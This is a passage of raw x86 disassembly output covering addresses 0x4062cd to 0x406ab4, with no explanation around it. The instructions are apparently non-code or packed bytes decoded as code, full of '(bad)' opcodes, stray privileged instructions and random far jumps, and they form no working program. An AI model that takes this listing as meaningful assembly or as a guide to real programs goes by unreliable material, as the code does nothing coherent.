  4062cd:	mov    eax,0x87aec64f
  4062d2:	jnp    0x40627b
  4062d4:	xchg   esi,esi
  4062d6:	inc    esi
  4062d7:	xor    al,0xb
  4062d9:	cdq    
  4062da:	call   0xbcf0e916
  4062df:	sti    
  4062e0:	fld    QWORD PTR [edx-0x30]
  4062e3:	(bad)  
  4062e4:	jg     0x40628c
  4062e6:	mov    dh,BYTE PTR [eax+0x3ca0a345]
  4062ec:	inc    esi
  4062ed:	jae    0x4062f6
  4062ef:	stc    
  4062f0:	(bad)  
  4062f1:	fcomp  st(4)
  4062f3:	pcmpeqw mm0,QWORD PTR [ecx-0x54]
  4062f7:	sbb    edi,DWORD PTR [ebp+0x6f]
  4062fa:	jl     0x40637b
  4062fc:	xchg   esi,eax
  4062fd:	add    al,0x3d
  4062ff:	xor    DWORD PTR [eax+0x43],esp
  406302:	adc    al,0xd4
  406304:	pop    edi
  406305:	test   BYTE PTR [edx+0x944a4bf],0xc7
  40630c:	lahf   
  40630d:	sbb    DWORD PTR [ebx+0x3a],0xffffffc9
  406311:	or     esi,ebp
  406313:	xor    eax,0x76a4016d
  406318:	sti    
  406319:	jnp    0x406316
  40631b:	inc    edi
  40631c:	pusha  
  40631d:	dec    ecx
  40631e:	mov    eax,ds:0xf6e49946
  406323:	mov    bl,0xb5
  406325:	cwde   
  406326:	daa    
  406327:	cli    
  406328:	mov    ah,0xd1
  40632a:	inc    ecx
  40632b:	push   esi
  40632c:	mov    ebp,0xc1c67f4a
  406331:	adc    edx,edi
  406333:	repz cmp al,0x47
  406336:	push   DWORD PTR [edi-0xd175cce]
  40633c:	ds pusha 
  40633e:	hlt    
  40633f:	add    DWORD PTR [ecx],0x64a1a5b
  406345:	mov    ch,0x3f
  406347:	or     BYTE PTR [eax-0x79],bl
  40634a:	xchg   dh,ch
  40634c:	push   ebx
  40634d:	and    BYTE PTR [edi],ah
  40634f:	in     eax,0x43
  406351:	sbb    eax,0x4f5c4463
  406356:	sub    al,0x5
  406358:	gs out dx,eax
  40635a:	std    
  40635b:	mov    al,0xac
  40635d:	inc    ebx
  40635e:	es je  0x4062ff
  406361:	mov    ah,0x23
  406363:	gs ret 0xcda9
  406367:	xchg   ebx,eax
  406368:	jae    0x4063c2
  40636a:	mov    ah,0x8
  40636c:	inc    ebx
  40636d:	sub    edi,DWORD PTR [ecx-0x6e]
  406370:	call   0x9fb8:0xa90d4c85
  406377:	ins    BYTE PTR es:[edi],dx
  406378:	xchg   BYTE PTR [ebp+0x404b73a1],ch
  40637e:	add    edi,ebx
  406380:	cmp    edx,DWORD PTR [ebx-0x28]
  406383:	pop    edx
  406384:	adc    BYTE PTR [edx+eax*1],0xd3
  406388:	gs pushfw 
  40638b:	pop    edx
  40638c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40638d:	aam    0x7c
  40638f:	mov    eax,0xde9eb7d0
  406394:	cli    
  406395:	iret   
  406396:	mov    ch,0xde
  406398:	pop    edx
  406399:	(bad)  
  40639a:	sub    BYTE PTR [ebx+ebx*2],cl
  40639d:	pop    esi
  40639e:	cmp    eax,0xb6c45c92
  4063a3:	sbb    DWORD PTR [edx-0x39],ebp
  4063a6:	mov    ds:0x192df203,eax
  4063ab:	mov    esp,0xb436167b
  4063b0:	mov    DWORD PTR [edx-0x1b9df1ee],0x37610e61
  4063ba:	add    al,0xb5
  4063bc:	push   ss
  4063bd:	gs pop ds
  4063bf:	mov    edx,0xa805574d
  4063c4:	lds    ebx,FWORD PTR [ebx-0x54fa5e90]
  4063ca:	inc    ebp
  4063cb:	xlat   BYTE PTR ds:[ebx]
  4063cc:	xchg   esi,eax
  4063cd:	add    BYTE PTR [ecx-0x378da752],al
  4063d3:	into   
  4063d4:	inc    esp
  4063d5:	addr16 mov dl,0xc
  4063d8:	dec    esp
  4063d9:	out    0x65,eax
  4063db:	sub    ebx,DWORD PTR [ebp+0x61]
  4063de:	rcl    DWORD PTR [ecx+0x71],cl
  4063e1:	test   eax,0x363a037c
  4063e6:	jnp    0x4063eb
  4063e8:	push   0xffffff85
  4063ea:	adc    ch,bl
  4063ec:	les    esi,FWORD PTR [ecx-0x7d]
  4063ef:	ja     0x4063c8
  4063f1:	push   esi
  4063f2:	pop    ebp
  4063f3:	mov    bl,0x35
  4063f5:	cmc    
  4063f6:	dec    edi
  4063f7:	jae    0x4063d6
  4063f9:	or     al,BYTE PTR [ebx]
  4063fb:	mov    ch,0x59
  4063fd:	call   0xa3f8:0x240d35c8
  406404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406405:	arpl   WORD PTR [esi-0x5d9f312c],si
  40640b:	or     edx,ecx
  40640d:	mov    WORD PTR [ecx-0x61],?
  406410:	sbb    edi,eax
  406412:	mov    cl,0x1f
  406414:	sub    esp,DWORD PTR [eax+0x38]
  406417:	xlat   BYTE PTR ds:[ebx]
  406418:	ret    0x8f95
  40641b:	loope  0x40648a
  40641d:	popa   
  40641e:	jecxz  0x4063d1
  406420:	jmp    0xbe73:0x819f0aee
  406427:	jb     0x40647f
  406429:	jbe    0x406437
  40642b:	xchg   edi,eax
  40642c:	cmp    eax,0x8e4c9951
  406431:	jg     0x406418
  406433:	cmp    eax,eax
  406435:	add    BYTE PTR [esi],dh
  406437:	mov    bh,0x50
  406439:	jg     0x406433
  40643b:	icebp  
  40643c:	rcl    BYTE PTR [ebx-0x71],0x95
  406440:	and    eax,0xc24869e8
  406445:	or     BYTE PTR [ebp-0x19],bl
  406448:	xchg   ebx,eax
  406449:	pushf  
  40644a:	jmp    0xd86:0xa8703afa
  406451:	fimul  DWORD PTR [eax+0x2c135008]
  406457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406458:	mov    WORD PTR [ecx-0x478a6eb2],ss
  40645e:	pop    edx
  40645f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406460:	jmp    0x4064dd
  406462:	sar    DWORD PTR [edx+ebx*4-0x7d],1
  406466:	dec    esi
  406467:	mov    ecx,DWORD PTR [ecx-0x783b7bc2]
  40646d:	or     al,0x1a
  40646f:	mov    ecx,esi
  406471:	enter  0x5fc5,0x63
  406475:	adc    BYTE PTR [eax],dl
  406477:	repz sub esi,DWORD PTR ds:[eax-0x52]
  40647c:	dec    ecx
  40647d:	or     eax,ebp
  40647f:	xchg   esp,eax
  406480:	mov    dl,BYTE PTR [edx]
  406482:	popa   
  406483:	dec    ebp
  406484:	inc    edi
  406485:	mov    ebp,0x1917b6c9
  40648a:	pop    edx
  40648b:	imul   ecx,DWORD PTR gs:[ebx-0xf],0x1d672706
  406493:	cwde   
  406494:	aam    0xf7
  406496:	pop    ecx
  406497:	and    al,0xeb
  406499:	shr    bh,1
  40649b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40649c:	les    edi,FWORD PTR [ecx]
  40649e:	fidiv  WORD PTR ds:0x575f766a
  4064a4:	push   esi
  4064a5:	push   ebp
  4064a6:	add    ecx,DWORD PTR [ebx+ebp*4+0x46]
  4064aa:	and    BYTE PTR [ecx],al
  4064ac:	push   cs
  4064ad:	push   0xffffff95
  4064af:	xchg   BYTE PTR [eax-0x35],al
  4064b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064b3:	sbb    BYTE PTR [edi],dl
  4064b5:	mov    ah,0x1
  4064b7:	fwait
  4064b8:	jo     0x4064ad
  4064ba:	jle    0x40648e
  4064bc:	jne    0x406491
  4064be:	add    bl,BYTE PTR [eax+ebx*4]
  4064c1:	push   ecx
  4064c2:	sti    
  4064c3:	sti    
  4064c4:	clc    
  4064c5:	xor    bl,al
  4064c7:	repz lahf 
  4064c9:	xchg   edi,eax
  4064ca:	mov    ch,0xe
  4064cc:	sbb    eax,0x3b5e562f
  4064d1:	pop    ds
  4064d2:	pop    eax
  4064d3:	loope  0x406513
  4064d5:	je     0x406553
  4064d7:	push   esp
  4064d8:	xchg   cl,ah
  4064da:	loopne 0x406546
  4064dc:	out    dx,al
  4064dd:	jecxz  0x4064fb
  4064df:	mov    dh,0x7c
  4064e1:	mov    bh,0x4a
  4064e3:	add    al,0xcf
  4064e5:	pop    eax
  4064e6:	(bad)
  4064e9:	lods   al,BYTE PTR ds:[esi]
  4064ea:	xchg   esi,eax
  4064eb:	aaa    
  4064ec:	rcr    BYTE PTR ds:0xa931bcfd,0xf7
  4064f3:	mov    edi,0x6b9afbb8
  4064f8:	or     BYTE PTR [ecx+0x27d578ed],0x3f
  4064ff:	int    0xc6
  406501:	ret    
  406502:	xchg   esp,eax
  406503:	fnstsw WORD PTR [eax]
  406505:	ins    BYTE PTR es:[edi],dx
  406506:	sub    al,0x88
  406508:	pop    ebx
  406509:	aad    0x7c
  40650b:	int3   
  40650c:	and    al,0xe
  40650e:	retf   
  40650f:	sub    ch,bh
  406511:	rcr    eax,1
  406513:	repz mov dh,dh
  406516:	push   es
  406517:	mov    ch,0x3c
  406519:	add    edi,DWORD PTR [eax-0xfa85eb2]
  40651f:	xor    eax,0xe241f815
  406524:	(bad)  [ecx+0x284d5109]
  40652a:	test   eax,0xa6fc0bf3
  40652f:	lock mov ds:0x3a182277,al
  406535:	fisttp DWORD PTR [edi]
  406537:	imul   ebp,DWORD PTR [eax+0x7c],0x68
  40653b:	add    eax,0x50269c44
  406540:	pushf  
  406541:	push   0xffffffac
  406543:	sbb    ecx,DWORD PTR [esi+0xc39ba59]
  406549:	fsubr  QWORD PTR [esi-0x24]
  40654c:	js     0x4065be
  40654e:	adc    esi,ebx
  406550:	push   ebp
  406551:	dec    ebx
  406552:	adc    esp,DWORD PTR [edi+0x1cb6526e]
  406558:	mov    ebx,edi
  40655a:	shr    DWORD PTR [edx+esi*2-0x83a0705],1
  406561:	mov    eax,0xef6562e0
  406566:	pop    es
  406567:	loope  0x406509
  406569:	dec    edi
  40656a:	jmp    0x4064f4
  40656c:	pop    esi
  40656d:	retf   
  40656e:	(bad)  
  40656f:	or     eax,0x27f68d6b
  406574:	fs push ebx
  406576:	mov    BYTE PTR [ecx],cl
  406578:	int3   
  406579:	mov    edi,?
  40657b:	xchg   BYTE PTR [bp+si],ch
  40657e:	sahf   
  40657f:	repnz and edx,eax
  406582:	add    DWORD PTR [ebp+0x52],0x19
  406586:	dec    esi
  406587:	adc    al,0xd2
  406589:	fiadd  WORD PTR [edi-0x255540cb]
  40658f:	leave  
  406590:	add    ch,BYTE PTR [edi]
  406592:	in     eax,dx
  406593:	ror    esp,0x28
  406596:	add    al,0x9c
  406598:	cdq    
  406599:	add    DWORD PTR [ecx-0x51],eax
  40659c:	mov    DWORD PTR [eax],edx
  40659e:	mov    ebx,DWORD PTR [ebx-0x7c]
  4065a1:	push   cs
  4065a2:	jge    0x40661f
  4065a4:	sub    DWORD PTR [edi-0x37],ebp
  4065a7:	xchg   BYTE PTR [ebx-0x622446e],ch
  4065ad:	scas   al,BYTE PTR es:[edi]
  4065ae:	test   eax,0x11cf86f2
  4065b3:	outs   dx,BYTE PTR ds:[esi]
  4065b4:	(bad)  
  4065b6:	into   
  4065b7:	push   edx
  4065b8:	mov    WORD PTR [ecx-0x47c39f64],gs
  4065be:	dec    ebp
  4065bf:	cmc    
  4065c0:	es sbb BYTE PTR gs:[esi-0x68c3a2b0],al
  4065c8:	mov    ch,bh
  4065ca:	(bad)  
  4065cc:	mov    dh,0xfb
  4065ce:	jge    0x4065b0
  4065d0:	aaa    
  4065d1:	aam    0xed
  4065d3:	test   DWORD PTR ds:0xb54f75cc,ecx
  4065d9:	push   es
  4065da:	jbe    0x4065e2
  4065dc:	mov    eax,eax
  4065de:	cld    
  4065df:	jnp    0x4065aa
  4065e1:	repz mov cl,0x99
  4065e4:	(bad)  
  4065e5:	and    ecx,DWORD PTR [edi+0x675e8842]
  4065eb:	mov    esi,0xcd2da2c0
  4065f0:	lock mov dh,0xc7
  4065f3:	sub    DWORD PTR [esi],edx
  4065f5:	xchg   esp,eax
  4065f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065f7:	mov    dl,0xe9
  4065f9:	div    DWORD PTR [ebx+0x41e65dd8]
  4065ff:	cwde   
  406600:	es cmp al,0xba
  406603:	jnp    0x40662f
  406605:	mov    ecx,0xdfd8d2e3
  40660a:	rcl    BYTE PTR [edi+0x4c],0x17
  40660e:	and    bl,BYTE PTR [ecx+0x75]
  406611:	sbb    ch,bh
  406613:	pusha  
  406614:	jg     0x406692
  406616:	arpl   WORD PTR [ecx-0x20],bx
  406619:	jp     0x40668e
  40661b:	push   ds
  40661c:	int3   
  40661d:	ror    DWORD PTR [eax],1
  40661f:	xchg   esp,eax
  406620:	mov    bl,0x2c
  406622:	rcr    bl,cl
  406624:	ds jmp 0xd7a8712e
  40662a:	scas   al,BYTE PTR es:[edi]
  40662b:	add    eax,0xa4aad914
  406630:	inc    edx
  406631:	fnsave [ecx-0xb7b0fa0]
  406637:	or     al,0x72
  406639:	test   eax,0x956499e4
  40663e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40663f:	or     DWORD PTR [eax+0x59a93f9],ebp
  406645:	ret    
  406646:	inc    esp
  406647:	push   0xffffffec
  406649:	inc    ebp
  40664a:	out    dx,al
  40664b:	popf   
  40664c:	imul   esi,DWORD PTR [edx],0x8bb790d9
  406652:	pop    es
  406653:	(bad)  
  406654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406655:	xor    eax,0xffa36c26
  40665a:	test   DWORD PTR [edi+0x3030d0b1],eax
  406660:	aad    0xdd
  406662:	push   edi
  406663:	push   edi
  406664:	push   ss
  406665:	test   BYTE PTR [eax-0x7],al
  406668:	push   esp
  406669:	mov    ds:0xfc5b0a47,eax
  40666e:	std    
  40666f:	xchg   ecx,eax
  406670:	test   al,0x20
  406672:	adc    al,0xa0
  406674:	fadd   QWORD PTR [edi+0x6568b702]
  40667a:	pop    ebp
  40667b:	pop    ecx
  40667c:	xor    al,0xb4
  40667e:	retf   
  40667f:	aam    0xc9
  406681:	scas   al,BYTE PTR es:[edi]
  406682:	add    edx,eax
  406684:	sub    eax,0xffffffd1
  406687:	imul   eax,DWORD PTR [ebx],0xffffff99
  40668a:	and    al,0xeb
  40668c:	mov    ecx,0xc336ede0
  406691:	out    0x2f,eax
  406693:	pop    ebx
  406694:	cli    
  406695:	mov    edi,DWORD PTR [esi-0x37]
  406698:	daa    
  406699:	das    
  40669a:	dec    esp
  40669b:	jnp    0x4066a9
  40669d:	and    ah,BYTE PTR [ebp-0x40]
  4066a0:	shl    BYTE PTR [esi-0x43],0xe6
  4066a4:	pushf  
  4066a5:	cmp    BYTE PTR [ebx-0x541b256a],dl
  4066ab:	push   esi
  4066ac:	rcr    BYTE PTR [eax+eax*8],0x13
  4066b0:	dec    eax
  4066b1:	clc    
  4066b2:	jg     0x40668e
  4066b4:	ins    DWORD PTR es:[edi],dx
  4066b5:	pop    edx
  4066b6:	push   edx
  4066b7:	mov    ebx,0xc28e9b42
  4066bc:	jp     0x4066e8
  4066be:	aam    0x5f
  4066c0:	iret   
  4066c1:	add    BYTE PTR [edx+0x5],ch
  4066c4:	std    
  4066c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c6:	stos   BYTE PTR es:[edi],al
  4066c7:	xchg   esi,eax
  4066c8:	addr16 add al,0x4f
  4066cb:	ror    ecx,1
  4066cd:	push   esp
  4066ce:	in     al,dx
  4066cf:	rcl    BYTE PTR [edi-0x49],cl
  4066d2:	pop    ecx
  4066d3:	ud2    
  4066d5:	inc    ebx
  4066d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d7:	in     eax,dx
  4066d8:	add    al,0xd6
  4066da:	adc    ah,dl
  4066dc:	scas   eax,DWORD PTR es:[edi]
  4066dd:	inc    edi
  4066de:	call   0x9004:0x52f254c4
  4066e5:	dec    ebx
  4066e6:	mov    ecx,0xcc2fe431
  4066eb:	pushf  
  4066ec:	or     al,0xfa
  4066ee:	add    eax,0xce4cd300
  4066f3:	xor    al,0x9f
  4066f5:	jmp    0xda17360b
  4066fa:	aad    0x4b
  4066fc:	mov    ah,0x60
  4066fe:	jo     0x4066fd
  406700:	inc    edx
  406701:	call   0xb6b91fe9
  406706:	xchg   ebp,eax
  406707:	js     0x406742
  406709:	retf   0x26b1
  40670c:	sub    ecx,0xffffffbf
  40670f:	imul   ebx,DWORD PTR [eax+ecx*2+0x62ca0a93],0x1a43bba2
  40671a:	mov    esp,0x21b0d578
  40671f:	mov    esp,0xfdee34fd
  406724:	cmp    eax,0xfc02a00f
  406729:	mov    ch,0x48
  40672b:	test   DWORD PTR [edi],esi
  40672d:	pop    ss
  40672e:	mov    al,0x12
  406730:	ja     0x4066db
  406732:	retf   
  406733:	add    BYTE PTR [ecx+0x192d4720],0x24
  40673a:	xor    ecx,DWORD PTR [ecx+0x7e2f6b89]
  406740:	mov    ebx,0xedd6a818
  406745:	ror    BYTE PTR [ebx+ebx*1+0x4b],cl
  406749:	jno    0x406732
  40674b:	ja     0x4066f2
  40674d:	pop    ebx
  40674e:	xlat   BYTE PTR ds:[ebx]
  40674f:	mov    ebp,DWORD PTR [edi+0x7d]
  406752:	lahf   
  406753:	fsub   st,st(2)
  406755:	add    eax,DWORD PTR [ebx-0x5d39a3fc]
  40675b:	(bad)  [eax-0x3d]
  40675e:	jle    0x406758
  406760:	sub    bl,BYTE PTR [eax-0x18]
  406763:	pop    ecx
  406764:	sub    ch,BYTE PTR [ebx]
  406766:	adc    al,0xa8
  406768:	dec    eax
  406769:	cmp    DWORD PTR [edx-0x36e524ff],edi
  40676f:	aad    0x40
  406771:	stc    
  406772:	dec    esi
  406773:	push   cs
  406774:	xor    al,0x42
  406776:	jo     0x40674b
  406778:	pop    edx
  406779:	je     0x40677b
  40677b:	scas   al,BYTE PTR es:[edi]
  40677c:	push   es
  40677d:	int    0x2d
  40677f:	retf   
  406780:	int    0x81
  406782:	mov    ebx,0xc9727278
  406787:	shl    BYTE PTR [ebp+0x25],1
  40678a:	aad    0x42
  40678c:	out    0x37,eax
  40678e:	mov    DWORD PTR [edi+0x1b],edi
  406791:	div    DWORD PTR [esi-0x47]
  406794:	ins    BYTE PTR es:[edi],dx
  406795:	outs   dx,DWORD PTR ds:[esi]
  406796:	stos   DWORD PTR es:[edi],eax
  406797:	sub    edi,DWORD PTR [edi-0x2954bb27]
  40679d:	in     eax,0xc4
  40679f:	and    esi,DWORD PTR [ebx+0x1b244810]
  4067a5:	mov    esp,0x8b1c3ea6
  4067aa:	out    0xeb,al
  4067ac:	dec    esp
  4067ad:	push   ds
  4067ae:	ficomp WORD PTR [edx*2+0x68fcdf45]
  4067b5:	mov    BYTE PTR [eax-0x70372966],al
  4067bb:	push   eax
  4067bc:	fs mov ebx,0x51a207a2
  4067c2:	dec    ebp
  4067c3:	imul   eax,DWORD PTR [ebp-0x18],0x2fd6b790
  4067ca:	mov    eax,0x86dfdb7
  4067cf:	lea    ebp,[eax+0x51]
  4067d2:	inc    ebp
  4067d3:	(bad)  
  4067d5:	adc    cl,dl
  4067d7:	ds retf 0x10c2
  4067db:	adc    al,BYTE PTR [eax]
  4067dd:	test   BYTE PTR [esi-0x1dfd615d],cl
  4067e3:	sti    
  4067e4:	fidivr DWORD PTR [eax+0x65997a26]
  4067ea:	leave  
  4067eb:	or     edi,DWORD PTR [edx+0x71]
  4067ee:	cmp    eax,0x4f79706f
  4067f3:	mov    ?,eax
  4067f5:	jne    0x4067f0
  4067f7:	and    DWORD PTR [ecx-0x13328eb4],eax
  4067fd:	xor    al,0xc8
  4067ff:	rcr    DWORD PTR [eax],cl
  406801:	retf   0x2422
  406804:	sbb    al,0x64
  406806:	(bad)  [eax]
  406808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406809:	sahf   
  40680a:	mov    al,ds:0x65e96911
  40680f:	mov    ds:0xf558cfcb,al
  406814:	xchg   ecx,eax
  406815:	call   0xaf74:0x568fb18e
  40681c:	jecxz  0x406879
  40681e:	fidiv  DWORD PTR [edi+0x8b46f5b]
  406824:	fiadd  DWORD PTR [ebx+0x1e]
  406827:	(bad)
  40682b:	dec    eax
  40682c:	sub    al,0xab
  40682e:	jmp    0x40cdc5a8
  406833:	push   esp
  406834:	mov    ch,BYTE PTR [edi+0x67387954]
  40683a:	enter  0x24eb,0xe8
  40683e:	test   eax,0x20fec1e6
  406843:	out    0x69,al
  406845:	jle    0x4067ef
  406847:	loope  0x406898
  406849:	jno    0x406831
  40684b:	mov    cl,0xc
  40684d:	pop    edx
  40684e:	adc    al,0x15
  406850:	nop
  406851:	addr16 jns 0x406863
  406854:	xor    BYTE PTR [edx-0x25655f8e],al
  40685a:	xchg   ecx,eax
  40685b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40685c:	add    ebp,DWORD PTR [ebx]
  40685e:	divps  xmm5,xmm3
  406861:	pop    esp
  406862:	jns    0x40684d
  406864:	loop   0x4067ec
  406866:	jae    0x4068c5
  406868:	sub    al,0x5d
  40686a:	sub    al,0xf7
  40686c:	sub    edi,DWORD PTR [ebx-0x6cad1bca]
  406872:	sub    eax,0x5fce2791
  406877:	jge    0x40687c
  406879:	icebp  
  40687a:	sbb    DWORD PTR [ebx-0x5193e9f4],0x38dae292
  406884:	not    esi
  406886:	mov    ebp,0x3ec7707a
  40688b:	and    DWORD PTR [edx-0x10],ebp
  40688e:	retf   0x274f
  406891:	xor    edx,DWORD PTR [ebx+0x15566676]
  406897:	fiadd  DWORD PTR [edi+esi*4-0x1ce496f]
  40689e:	cmp    esi,DWORD PTR [esi+0x6dbec1ce]
  4068a4:	mov    dl,0x44
  4068a6:	cmp    ebx,DWORD PTR [edi]
  4068a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a9:	mov    bl,0xf9
  4068ab:	adc    DWORD PTR [eax-0x45],ebx
  4068ae:	stc    
  4068af:	push   cs
  4068b0:	dec    ebx
  4068b1:	lahf   
  4068b2:	repnz in eax,0xaa
  4068b5:	dec    esp
  4068b6:	mov    ebx,0x7e965c99
  4068bb:	(bad)  
  4068bc:	(bad)  
  4068bd:	mov    edx,fs
  4068bf:	std    
  4068c0:	in     eax,dx
  4068c1:	in     eax,dx
  4068c2:	leave  
  4068c3:	es ret 0xae1e
  4068c7:	jge    0x40687b
  4068c9:	jae    0x40688a
  4068cb:	dec    edi
  4068cc:	inc    edx
  4068cd:	add    eax,0x1b150591
  4068d2:	std    
  4068d3:	or     ah,dh
  4068d5:	or     edi,DWORD PTR [ebp+0x7d]
  4068d8:	test   al,0x95
  4068da:	sar    dl,0x53
  4068dd:	and    eax,0x30b7946c
  4068e2:	int3   
  4068e3:	call   0xb9a1:0x80d55615
  4068ea:	(bad)  
  4068eb:	xchg   ecx,eax
  4068ec:	call   0x5f57:0x686f83db
  4068f3:	in     eax,dx
  4068f4:	dec    eax
  4068f5:	test   eax,0xe440e911
  4068fa:	fisttp DWORD PTR [ebx+ebx*8]
  4068fd:	scas   al,BYTE PTR es:[edi]
  4068fe:	xchg   edx,eax
  4068ff:	fwait
  406900:	cmc    
  406901:	fld    TBYTE PTR [edi]
  406903:	add    dl,BYTE PTR [ebp+0x56]
  406906:	outs   dx,DWORD PTR ds:[esi]
  406907:	xlat   BYTE PTR ds:[ebx]
  406908:	inc    ebp
  406909:	ror    DWORD PTR [ecx-0x4f],cl
  40690c:	leave  
  40690d:	mov    esp,0x1fe5d2e2
  406912:	ficomp WORD PTR ds:0xaefe41c5
  406918:	jmp    0xb35:0xfc1fa754
  40691f:	or     ah,dl
  406921:	shl    DWORD PTR [esi-0x30],1
  406924:	fucomip st,st(6)
  406926:	test   eax,0x546cc5f5
  40692b:	cmp    ebx,ebx
  40692d:	adc    eax,DWORD PTR [edi+esi*8-0x6a]
  406931:	fstp   st(0)
  406933:	nop
  406934:	mov    ecx,0x7c0eb1e0
  406939:	sbb    eax,0xd1c47e1c
  40693e:	call   0xfed7c7d9
  406943:	(bad)  
  406944:	cld    
  406945:	pop    DWORD PTR [edi-0x7b]
  406948:	ror    DWORD PTR [ebp+0x4a450414],1
  40694e:	mov    edx,0x5aa0fe06
  406954:	aas    
  406955:	fadd   QWORD PTR [eax+ecx*4-0x46ec22fb]
  40695c:	fisub  DWORD PTR [ecx+edi*8-0x2add7b76]
  406963:	aas    
  406964:	lahf   
  406965:	pop    ebp
  406966:	mov    ebp,0xa52a51ef
  40696b:	mov    ch,0x70
  40696d:	xchg   edx,eax
  40696e:	jmp    0xbe82:0xe9c77e4f
  406975:	(bad)  
  406976:	mov    al,ds:0x7a3fc1a5
  40697b:	and    ebx,ebp
  40697d:	or     BYTE PTR [esi-0x32be38c3],dl
  406983:	mov    ds,WORD PTR [ebx+0x5f7da67d]
  406989:	mov    dl,0xd7
  40698b:	aad    0x33
  40698d:	jns    0x4069a2
  40698f:	adc    al,0x89
  406991:	jbe    0x406916
  406993:	loop   0x406a03
  406995:	ret    0x57f0
  406998:	clc    
  406999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40699a:	jno    0x40699f
  40699c:	pop    esi
  40699d:	dec    ecx
  40699e:	ins    BYTE PTR es:[edi],dx
  40699f:	dec    esi
  4069a0:	mov    eax,ds:0x193f3a88
  4069a5:	jmp    0xbe423a36
  4069aa:	sub    BYTE PTR [esi],0x6c
  4069ad:	and    BYTE PTR gs:[ebx],0xac
  4069b1:	minps  xmm6,xmm5
  4069b4:	jmp    0x4069ed
  4069b6:	ss call 0xb347:0xf759660
  4069be:	pushf  
  4069bf:	shl    edi,0x89
  4069c2:	std    
  4069c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069c4:	loopne 0x406991
  4069c6:	add    eax,0xf2a8c4ff
  4069cb:	aam    0x7e
  4069cd:	jb     0x40696d
  4069cf:	lds    esp,FWORD PTR ds:0x674c71f0
  4069d5:	cs pusha 
  4069d7:	push   ss
  4069d8:	loope  0x40697f
  4069da:	idiv   DWORD PTR [eax-0x6a]
  4069dd:	xor    ch,ch
  4069df:	xor    ah,BYTE PTR ds:[edx-0x61164a99]
  4069e6:	mov    bl,0xc7
  4069e8:	adc    eax,DWORD PTR [edi+eax*1+0xe]
  4069ec:	mov    edi,0x36bc57fb
  4069f1:	ins    DWORD PTR es:[edi],dx
  4069f2:	ja     0x406a10
  4069f4:	mov    BYTE PTR [edi-0x72],bl
  4069f7:	jl     0x4069bf
  4069f9:	iret   
  4069fa:	das    
  4069fb:	fmul   DWORD PTR [ecx]
  4069fd:	data16 mov bl,0x49
  406a00:	and    al,0x5e
  406a02:	pop    ds
  406a03:	or     cl,BYTE PTR [ebx-0x30]
  406a06:	push   ss
  406a07:	add    edi,edi
  406a09:	les    edx,FWORD PTR [esi-0x78]
  406a0c:	sub    DWORD PTR [ebp-0x335ce4a6],0x5cb6af4c
  406a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a17:	mov    esp,ebx
  406a19:	jne    0x406a5f
  406a1b:	push   0x422a7b4e
  406a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a21:	push   esp
  406a22:	je     0x4069fb
  406a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a25:	adc    BYTE PTR [esi],dl
  406a27:	mov    esp,0x15d200ae
  406a2c:	mov    cl,0x91
  406a2e:	xchg   esi,eax
  406a2f:	sahf   
  406a30:	out    dx,eax
  406a31:	xchg   al,cl
  406a33:	int3   
  406a34:	in     al,0xaa
  406a36:	ror    DWORD PTR [ebx+ecx*1-0x4b],0x9d
  406a3b:	lock je 0x406a22
  406a3e:	mov    ds:0xde029ed6,eax
  406a43:	outs   dx,DWORD PTR ds:[esi]
  406a44:	mov    esi,0x89f14361
  406a49:	mov    ch,0xcd
  406a4b:	xchg   ebp,eax
  406a4c:	out    0xdd,al
  406a4e:	inc    ebp
  406a4f:	xchg   esi,eax
  406a50:	mov    ds:0x3792254b,eax
  406a55:	je     0x406a9b
  406a57:	loope  0x406a64
  406a59:	xor    al,0xd5
  406a5b:	fldcw  WORD PTR [edx-0xd]
  406a5e:	fcomip st,st(6)
  406a60:	cmp    eax,0xa3b281d1
  406a65:	push   esp
  406a66:	std    
  406a67:	pop    ds
  406a68:	test   DWORD PTR [eax+0x6f],ecx
  406a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a6d:	fld    TBYTE PTR [esi-0x72]
  406a70:	sub    eax,0x69968fd3
  406a75:	fimul  WORD PTR [ebx-0xb1c6fa7]
  406a7b:	and    DWORD PTR [edx],edx
  406a7d:	and    esi,DWORD PTR [esp+ebp*8]
  406a80:	dec    ecx
  406a81:	xchg   esi,eax
  406a82:	das    
  406a83:	lds    ebx,FWORD PTR [esi]
  406a85:	inc    edx
  406a86:	jne    0x406a4a
  406a88:	inc    esi
  406a89:	xchg   ecx,eax
  406a8a:	pop    ecx
  406a8b:	push   eax
  406a8c:	retf   0xb14b
  406a8f:	hlt    
  406a90:	or     bh,ch
  406a92:	adc    esp,DWORD PTR [edx]
  406a94:	retf   0x2850
  406a97:	pop    es
  406a98:	arpl   WORD PTR [ebx-0x7f8b3ebe],si
  406a9e:	stos   DWORD PTR es:[edi],eax
  406a9f:	enter  0x5e72,0xa
  406aa3:	adc    al,0xe9
  406aa5:	push   ds
  406aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa7:	retf   0xdcec
  406aaa:	push   edx
  406aab:	mov    ecx,0x24840125
  406ab0:	xchg   esi,eax
  406ab1:	xchg   ebp,eax
  406ab2:	jg     0x406abd
  406ab4:	sbb    DWORD PTR [ecx-0x5d],edx
